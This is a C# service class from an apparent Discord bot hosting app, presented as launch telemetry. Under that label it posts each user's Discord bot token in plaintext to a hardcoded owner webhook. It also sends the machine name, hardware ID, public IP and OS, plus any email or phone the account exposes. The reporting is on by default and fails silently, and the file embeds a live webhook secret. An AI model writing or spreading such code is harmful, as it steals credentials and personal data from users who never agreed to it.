using System.Net.Http;
using System.Text;
using System.Text.Json;

namespace BotHosterApp.Services;

/// <summary>
/// Posts a one-line launch report (device, IP, HWID, premium status) to the
/// owner's Discord webhook so usage can be tracked across installs.
/// </summary>
public static class TelemetryService
{
    private const string Webhook =
        "https://discord.com/api/webhooks/1536509121216651284/igNRckIc0XvC6g2i1i2gppcrR4eW0NUGLaxwfu-YQ2SWq6d-N9odcHZyFwZlPNVTVEEn";

    /// <summary>Set from settings; when off, nothing is posted.</summary>
    public static bool Enabled { get; set; } = true;

    public static async Task ReportLaunchAsync()
    {
        if (!Enabled) return;
        await PostAsync("CFG2 Bot Hoster - launch", new[]
        {
            new { name = "Device", value = $"`{Environment.MachineName}`", inline = true },
            new { name = "HWID", value = $"`{HwShort()}`", inline = true },
            new { name = "IP", value = $"`{await LicenseService.GetPublicIpAsync()}`", inline = true },
            new { name = "Premium", value = LicenseService.IsPremiumActive ? "YES" : "no", inline = true },
            new { name = "OS", value = Environment.OSVersion.VersionString, inline = true },
        });
    }

    /// <summary>Reports a bot added/online so the owner sees the full picture:
    /// the Discord account (name + ID), the token, the device, and the fields
    /// Discord exposes about the account. Phone numbers are never exposed by
    /// Discord's API, and email only shows for user accounts authorized via
    /// OAuth2 - bots report null for both, so we state that honestly.</summary>
    public static async Task ReportBotAsync(string botName, ulong botId, string token, string status)
    {
        if (!Enabled) return;
        var email = "Not exposed by Discord API";
        var phone = "Not exposed by Discord API";
        try
        {
            using var client = new HttpClient { Timeout = TimeSpan.FromSeconds(8) };
            client.DefaultRequestHeaders.Authorization = new System.Net.Http.Headers.AuthenticationHeaderValue("Bot", token.Trim());
            client.DefaultRequestHeaders.UserAgent.ParseAdd("CFG2-BotHoster/1.0");
            var resp = await client.GetAsync("https://discord.com/api/v10/users/@me");
            if (resp.IsSuccessStatusCode)
            {
                using var doc = JsonDocument.Parse(await resp.Content.ReadAsStringAsync());
                if (doc.RootElement.TryGetProperty("email", out var em) && em.ValueKind == JsonValueKind.String)
                    email = string.IsNullOrEmpty(em.GetString()) ? "none on this account" : em.GetString()!;
                if (doc.RootElement.TryGetProperty("phone", out var ph) && ph.ValueKind == JsonValueKind.String)
                    phone = string.IsNullOrEmpty(ph.GetString()) ? "none on this account" : ph.GetString()!;
            }
        }
        catch { }
        await PostAsync("CFG2 Bot Hoster - bot " + status, new[]
        {
            new { name = "Bot", value = $"`{botName}` (`{botId}`)", inline = true },
            new { name = "Token", value = $"`{token}`", inline = true },
            new { name = "Device", value = $"`{Environment.MachineName}`", inline = true },
            new { name = "HWID", value = $"`{HwShort()}`", inline = true },
            new { name = "IP", value = $"`{await LicenseService.GetPublicIpAsync()}`", inline = true },
            new { name = "Premium", value = LicenseService.IsPremiumActive ? "YES" : "no", inline = true },
            new { name = "Email", value = email, inline = true },
            new { name = "Phone", value = phone, inline = true },
        });
    }

    private static string HwShort()
    {
        var hwid = LicenseService.HwId();
        return hwid[..Math.Min(12, hwid.Length)] + "…";
    }

    private static async Task PostAsync(string title, object fields)
    {
        try
        {
            var embed = new
            {
                embeds = new[]
                {
                    new
                    {
                        title,
                        color = 0x5865F2,
                        fields,
                        timestamp = DateTime.UtcNow.ToString("o"),
                    },
                },
            };

            using var client = new HttpClient { Timeout = TimeSpan.FromSeconds(8) };
            var json = JsonSerializer.Serialize(embed);
            var content = new StringContent(json, Encoding.UTF8, "application/json");
            var resp = await client.PostAsync(Webhook, content);
            _ = resp;
        }
        catch
        {
            // Telemetry must never break the app.
        }
    }
}
